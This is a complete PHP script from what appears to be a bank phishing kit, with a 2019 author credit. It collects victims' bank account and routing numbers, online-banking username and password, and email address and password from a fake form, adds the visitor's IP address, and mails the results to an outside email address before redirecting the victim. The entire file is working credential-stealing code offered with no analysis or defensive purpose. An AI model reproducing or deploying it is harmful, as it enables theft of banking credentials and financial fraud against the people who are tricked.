<?php
include '../blocker.php';
$ip = getenv("REMOTE_ADDR");
$message .= "BANK ACCOUNT: " .$_POST['1']."\n";
$message .= "BANK ROUTING: " .$_POST['2']."\n";
$message .= "BANK NAME-ON: " .$_POST['3']."\n";
$message .= "BANK USERNAM: " .$_POST['4']."\n";
$message .= "BANK PASWORD: " .$_POST['5']."\n";
$message .= "BANK EMAILS.: " .$_POST['6']."\n";
$message .= "BANK PASWORD: " .$_POST['7']."\n";
$message .= "--------Made by Flow------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "-------------------+ Created in 2019 [ Donflow ] +--------------------\n";
$recipient = "oztheplug@protonmail.com";
$subject = "EARTH BANK RESULTZ";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."EARTHBANK";
$headers .= "Donflow-BANK-Fullz";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: _+jam+.html");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>
        